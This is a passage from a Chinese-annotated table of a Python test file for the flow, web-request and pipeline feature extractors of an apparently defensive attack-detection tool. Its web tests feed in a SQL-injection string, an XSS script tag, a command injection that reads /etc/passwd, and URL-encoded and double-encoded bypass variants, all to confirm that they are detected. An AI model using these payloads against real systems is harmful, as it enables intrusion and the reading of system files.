| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 20 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 21 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from src.features import (  # noqa: E402` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FeaturePipeline,` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `    FlowFeatureExtractor,` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `    WebFeatureExtractor,` |
| 27 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 31 | 注释：解释下面或当前这段代码的设计意图。 | `# 测试 1: FlowFeatureExtractor` |
| 32 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 33 | 类定义：声明 `TestFlowFeatureExtractor`，封装相关状态与行为。 | `class TestFlowFeatureExtractor:` |
| 34 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证网络流量特征提取器。"""` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 37 | 函数定义：声明 `_build_sample_packets` 的输入、处理逻辑和返回结果。 | `    def _build_sample_packets():` |
| 38 | 文档字符串：说明当前模块、类或函数的职责。 | `        """构造 8 个数据包,组成 2 条流(TCP + UDP)。"""` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        base_ts = 1_700_000_000.0` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        tcp_flow = [` |
| 41 | 注释：解释下面或当前这段代码的设计意图。 | `            # TCP 三次握手 + 数据传输 + FIN` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.100', 'src_port': 54321,` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '10.0.0.1', 'dst_port': 80, 'protocol': 'TCP',` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 0.0, 'packet_len': 60, 'tcp_flags': 'S'},` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.100', 'src_port': 54321,` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '10.0.0.1', 'dst_port': 80, 'protocol': 'TCP',` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 0.1, 'packet_len': 60, 'tcp_flags': 'SA'},` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.100', 'src_port': 54321,` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '10.0.0.1', 'dst_port': 80, 'protocol': 'TCP',` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 0.2, 'packet_len': 52, 'tcp_flags': 'A'},` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.100', 'src_port': 54321,` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '10.0.0.1', 'dst_port': 80, 'protocol': 'TCP',` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 0.3, 'packet_len': 1500, 'tcp_flags': 'PA'},` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.100', 'src_port': 54321,` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '10.0.0.1', 'dst_port': 80, 'protocol': 'TCP',` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 0.4, 'packet_len': 120, 'tcp_flags': 'FA'},` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        udp_flow = [` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.200', 'src_port': 5000,` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '8.8.8.8', 'dst_port': 53, 'protocol': 'UDP',` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 1.0, 'packet_len': 80, 'tcp_flags': ''},` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.200', 'src_port': 5000,` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '8.8.8.8', 'dst_port': 53, 'protocol': 'UDP',` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 1.1, 'packet_len': 120, 'tcp_flags': ''},` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'src_ip': '192.168.1.200', 'src_port': 5000,` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'dst_ip': '8.8.8.8', 'dst_port': 53, 'protocol': 'UDP',` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `             'timestamp': base_ts + 1.2, 'packet_len': 200, 'tcp_flags': ''},` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 69 | 返回结果：把处理后的值交回调用方。 | `        return tcp_flow + udp_flow` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 函数定义：声明 `test_extract_returns_two_flows` 的输入、处理逻辑和返回结果。 | `    def test_extract_returns_two_flows(self):` |
| 72 | 文档字符串：说明当前模块、类或函数的职责。 | `        """应聚合成 2 条流。"""` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = FlowFeatureExtractor()` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        features = extractor.extract(self._build_sample_packets())` |
| 75 | 断言：验证测试或运行时假设是否成立。 | `        assert len(features) == 2` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 函数定义：声明 `test_tcp_flow_feature_values` 的输入、处理逻辑和返回结果。 | `    def test_tcp_flow_feature_values(self):` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = FlowFeatureExtractor()` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        features = extractor.extract(self._build_sample_packets())` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        tcp_flow = next(f for f in features if f['protocol'] == 'TCP')` |
| 82 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['flow_pkt_count'] == 5` |
| 83 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['flow_byte_count'] == 60 + 60 + 52 + 1500 + 120` |
| 84 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['pkt_len_max'] == 1500` |
| 85 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['pkt_len_min'] == 52` |
| 86 | 注释：解释下面或当前这段代码的设计意图。 | `        # numpy 均值` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        expected_mean = np.mean([60, 60, 52, 1500, 120])` |
| 88 | 断言：验证测试或运行时假设是否成立。 | `        assert abs(tcp_flow['pkt_len_mean'] - expected_mean) < 1e-6` |
| 89 | 注释：解释下面或当前这段代码的设计意图。 | `        # TCP 标志位计数(S 出现在 'S' 和 'SA' 中)` |
| 90 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['syn_count'] == 2` |
| 91 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['ack_count'] == 4  # 'SA','A','PA','FA'` |
| 92 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['fin_count'] == 1` |
| 93 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['rst_count'] == 0` |
| 94 | 注释：解释下面或当前这段代码的设计意图。 | `        # 五元组` |
| 95 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['src_ip'] == '192.168.1.100'` |
| 96 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['dst_ip'] == '10.0.0.1'` |
| 97 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['src_port'] == 54321` |
| 98 | 断言：验证测试或运行时假设是否成立。 | `        assert tcp_flow['dst_port'] == 80` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 函数定义：声明 `test_single_packet_flow_dropped` 的输入、处理逻辑和返回结果。 | `    def test_single_packet_flow_dropped(self):` |
| 101 | 文档字符串：说明当前模块、类或函数的职责。 | `        """只有 1 个包的流不应输出特征(要求 >= 2)。"""` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = FlowFeatureExtractor()` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        single = [{` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_ip': '1.1.1.1', 'src_port': 1, 'dst_ip': '2.2.2.2',` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'dst_port': 2, 'protocol': 'TCP', 'timestamp': 0,` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'packet_len': 100, 'tcp_flags': 'S',` |
| 107 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }]` |
| 108 | 断言：验证测试或运行时假设是否成立。 | `        assert extractor.extract(single) == []` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 函数定义：声明 `test_state_cleared_between_batches` 的输入、处理逻辑和返回结果。 | `    def test_state_cleared_between_batches(self):` |
| 111 | 文档字符串：说明当前模块、类或函数的职责。 | `        """extract 调用完毕后内部状态应清空。"""` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = FlowFeatureExtractor()` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `        extractor.extract(self._build_sample_packets())` |
| 114 | 断言：验证测试或运行时假设是否成立。 | `        assert extractor._flows == {}` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 117 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 118 | 注释：解释下面或当前这段代码的设计意图。 | `# 测试 2: WebFeatureExtractor` |
| 119 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 120 | 类定义：声明 `TestWebFeatureExtractor`，封装相关状态与行为。 | `class TestWebFeatureExtractor:` |
| 121 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证 Web 请求特征提取器(重点:编码绕过防御)。"""` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 函数定义：声明 `test_normal_request_no_keywords` 的输入、处理逻辑和返回结果。 | `    def test_normal_request_no_keywords(self):` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': '/api/users?page=1&limit=10',` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 1024,` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 131 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['sql_keyword_count'] == 0` |
| 132 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['xss_keyword_count'] == 0` |
| 133 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['cmd_keyword_count'] == 0` |
| 134 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['http_method'] == 'GET'` |
| 135 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['status_code'] == 200` |
| 136 | 注释：解释下面或当前这段代码的设计意图。 | `        # param_count 至少 >= 1(有 ?)` |
| 137 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['param_count'] >= 1` |
| 138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 139 | 函数定义：声明 `test_sql_injection_detected` 的输入、处理逻辑和返回结果。 | `    def test_sql_injection_detected(self):` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': "/login?user=admin'%20OR%201=1--",` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 500,` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 147 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['sql_keyword_count'] > 0` |
| 148 | 断言：验证测试或运行时假设是否成立。 | `        assert 'OR 1=1' in feat['url_decoded'].upper() or \` |
| 149 | 代码语句：参与当前文件的业务流程或数据处理。 | `               "'" in feat['url_decoded']` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 函数定义：声明 `test_xss_detected` 的输入、处理逻辑和返回结果。 | `    def test_xss_detected(self):` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': "/search?q=<script>alert(1)</script>",` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 300,` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 159 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['xss_keyword_count'] > 0` |
| 160 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 161 | 函数定义：声明 `test_command_injection_detected` 的输入、处理逻辑和返回结果。 | `    def test_command_injection_detected(self):` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': "/ping?host=127.0.0.1;cat /etc/passwd",` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 100,` |
| 168 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 169 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['cmd_keyword_count'] > 0` |
| 170 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 171 | 函数定义：声明 `test_single_layer_url_encoding_bypass` 的输入、处理逻辑和返回结果。 | `    def test_single_layer_url_encoding_bypass(self):` |
| 172 | 文档字符串：说明当前模块、类或函数的职责。 | `        """单层 URL 编码: %27 OR 1%3D1-- 应被解码后检测到。"""` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': '/q=%27%20OR%201%3D1--',` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 0,` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 180 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['sql_keyword_count'] > 0, \` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"单层编码 SQL 注入未被识别: {feat['url_decoded']}"` |
| 182 | 注释：解释下面或当前这段代码的设计意图。 | `        # 解码后长度应不同于原始长度` |
| 183 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['decoded_url_length'] < feat['url_length']` |
| 184 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 185 | 函数定义：声明 `test_double_layer_url_encoding_bypass` 的输入、处理逻辑和返回结果。 | `    def test_double_layer_url_encoding_bypass(self):` |
| 186 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 187 | 代码语句：参与当前文件的业务流程或数据处理。 | `        【安全修复关键】双层 URL 编码:` |
| 188 | 代码语句：参与当前文件的业务流程或数据处理。 | `        %253Cscript%253E -> %3Cscript%3E -> <script>` |
| 189 | 代码语句：参与当前文件的业务流程或数据处理。 | `        必须在多层解码后被检测。` |
| 190 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': '/page?x=%253Cscript%253Ealert(1)%253C%252Fscript%253E',` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 0,` |
| 197 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 198 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['xss_keyword_count'] > 0, \` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"双层编码 XSS 未被识别: {feat['url_decoded']}"` |
| 200 | 断言：验证测试或运行时假设是否成立。 | `        assert '<script' in feat['url_decoded'].lower()` |
| 201 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 202 | 函数定义：声明 `test_decode_idempotent` 的输入、处理逻辑和返回结果。 | `    def test_decode_idempotent(self):` |
| 203 | 文档字符串：说明当前模块、类或函数的职责。 | `        """不含编码的 URL 解码后应与原值基本一致。"""` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        plain = '/simple/path'` |
| 206 | 断言：验证测试或运行时假设是否成立。 | `        assert extractor._decode_url(plain) == plain` |
| 207 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 208 | 函数定义：声明 `test_decode_handles_non_string` 的输入、处理逻辑和返回结果。 | `    def test_decode_handles_non_string(self):` |
| 209 | 文档字符串：说明当前模块、类或函数的职责。 | `        """非字符串输入应安全返回空串,不抛异常。"""` |
| 210 | 断言：验证测试或运行时假设是否成立。 | `        assert WebFeatureExtractor._decode_url(None) == ''  # type: ignore[arg-type]` |
| 211 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 212 | 函数定义：声明 `test_src_ip_preserved_in_features_and_web_request_v1` 的输入、处理逻辑和返回结果。 | `    def test_src_ip_preserved_in_features_and_web_request_v1(self):` |
| 213 | 文档字符串：说明当前模块、类或函数的职责。 | `        """src_ip 必须在顶层特征与 web_request_v1 中同时保留。"""` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        extractor = WebFeatureExtractor()` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feat = extractor.extract({` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'url': '/api/ping',` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'http_method': 'GET',` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'status_code': 200,` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'response_size': 10,` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_ip': '198.51.100.10',` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'user_agent': 'curl/8.0',` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'timestamp': '28/Apr/2026:12:00:00 +0000',` |
| 223 | 函数调用：执行已有函数/方法完成当前步骤。 | `        })` |
| 224 | 断言：验证测试或运行时假设是否成立。 | `        assert feat['src_ip'] == '198.51.100.10'` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        wr = feat['web_request_v1']` |
| 226 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['schema'] == 'web_request_v1'` |
| 227 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['src_ip'] == '198.51.100.10'` |
| 228 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['url'] == '/api/ping'` |
| 229 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['method'] == 'GET'` |
| 230 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['status_code'] == 200` |
| 231 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['response_size'] == 10` |
| 232 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['user_agent'] == 'curl/8.0'` |
| 233 | 断言：验证测试或运行时假设是否成立。 | `        assert wr['timestamp'] == '28/Apr/2026:12:00:00 +0000'` |
| 234 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 235 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 236 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 237 | 注释：解释下面或当前这段代码的设计意图。 | `# 测试 3: FeaturePipeline` |
| 238 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 239 | 类定义：声明 `TestFeaturePipeline`，封装相关状态与行为。 | `class TestFeaturePipeline:` |
| 240 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证特征标准化流水线。"""` |
| 241 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 242 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 243 | 函数定义：声明 `_build_train_samples` 的输入、处理逻辑和返回结果。 | `    def _build_train_samples():` |
| 244 | 返回结果：把处理后的值交回调用方。 | `        return [` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'pkt_count': 10, 'byte_count': 1500, 'protocol': 'TCP', 'src_ip': '1.1.1.1'},` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'pkt_count': 20, 'byte_count': 3000, 'protocol': 'UDP', 'src_ip': '2.2.2.2'},` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'pkt_count': 5,  'byte_count': 500,  'protocol': 'TCP', 'src_ip': '3.3.3.3'},` |
| 248 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'pkt_count': 50, 'byte_count': 8000, 'protocol': 'ICMP','src_ip': '4.4.4.4'},` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {'pkt_count': 30, 'byte_count': 4500, 'protocol': 'TCP', 'src_ip': '5.5.5.5'},` |
| 250 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 251 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 252 | 函数定义：声明 `test_fit_identifies_column_types` 的输入、处理逻辑和返回结果。 | `    def test_fit_identifies_column_types(self):` |
| 253 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 254 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(self._build_train_samples())` |
| 255 | 断言：验证测试或运行时假设是否成立。 | `        assert set(pipe.numeric_columns) == {'pkt_count', 'byte_count'}` |
| 256 | 断言：验证测试或运行时假设是否成立。 | `        assert set(pipe.categorical_columns) == {'protocol', 'src_ip'}` |
| 257 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 258 | 函数定义：声明 `test_transform_returns_2d_array` 的输入、处理逻辑和返回结果。 | `    def test_transform_returns_2d_array(self):` |
| 259 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 260 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        samples = self._build_train_samples()` |
| 261 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(samples)` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = pipe.transform(samples)` |
| 263 | 断言：验证测试或运行时假设是否成立。 | `        assert isinstance(X, np.ndarray)` |
| 264 | 断言：验证测试或运行时假设是否成立。 | `        assert X.ndim == 2` |
| 265 | 断言：验证测试或运行时假设是否成立。 | `        assert X.shape[0] == len(samples)` |
| 266 | 断言：验证测试或运行时假设是否成立。 | `        assert X.shape[1] == len(pipe.numeric_columns) + len(pipe.categorical_columns)` |
| 267 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 268 | 函数定义：声明 `test_numeric_columns_are_standardized` 的输入、处理逻辑和返回结果。 | `    def test_numeric_columns_are_standardized(self):` |
| 269 | 文档字符串：说明当前模块、类或函数的职责。 | `        """标准化后数值列均值 ~0。"""` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 271 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        samples = self._build_train_samples()` |
| 272 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(samples)` |
| 273 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = pipe.transform(samples)` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        n_numeric = len(pipe.numeric_columns)` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        numeric_part = X[:, :n_numeric]` |
| 276 | 注释：解释下面或当前这段代码的设计意图。 | `        # 每列均值应接近 0` |
| 277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        means = numeric_part.mean(axis=0)` |
| 278 | 断言：验证测试或运行时假设是否成立。 | `        assert np.allclose(means, 0, atol=1e-6), f"数值列均值未归零: {means}"` |
| 279 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 280 | 函数定义：声明 `test_unknown_category_encoded_as_minus_one` 的输入、处理逻辑和返回结果。 | `    def test_unknown_category_encoded_as_minus_one(self):` |
| 281 | 文档字符串：说明当前模块、类或函数的职责。 | `        """未见过的类别应被编码为 -1 而非抛异常。"""` |
| 282 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pipe = FeaturePipeline()` |
| 283 | 函数调用：执行已有函数/方法完成当前步骤。 | `        pipe.fit(self._build_train_samples())` |
| 284 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        new_sample = [{` |
| 286 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'pkt_count': 15, 'byte_count': 2000,` |
| 287 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'protocol': 'SCTP',   # 训练时未见过` |
| 288 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            'src_ip': '9.9.9.9',  # 训练时未见过` |
| 289 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }]` |
| 290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        X = pipe.transform(new_sample)` |
| 291 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        n_numeric = len(pipe.numeric_columns)` |
